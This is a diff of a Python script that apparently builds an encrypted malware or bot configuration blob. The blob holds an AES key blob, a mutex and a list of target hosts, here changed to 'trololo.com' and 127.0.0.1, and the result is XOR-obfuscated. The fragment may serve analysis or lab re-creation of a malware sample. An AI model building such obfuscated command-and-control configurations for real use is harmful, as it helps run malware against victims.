@@ -30,8 +30,8 @@ class Builder():
         self.addArray(s)
     def addTargets(self, ts):
         for t in ts:
-            d, s = t
-            self.addDword(d)
+            w, s = t
+            self.addWord(w)
             self.addString(s)
     def padd(self, n=8):
         if (len(self.r)%8 != 0):
@@ -70,7 +70,8 @@ blob = aes128Blob(bType    = PLAINTEXTKEYBLOB,
 b = Builder()
 b.addBlob(blob)
 b.addString(MUTEX)
-b.addTargets([[0x932B0002, "127.0.0.1"], [0x932B0002, "localhost"]])
+b.addTargets([[0x932B, "trololo.com"], [0x932B, "127.0.0.1"]])
+b.addDword(0)
 b.addDword(0)
 b.padd()
 b.XorCrypt()
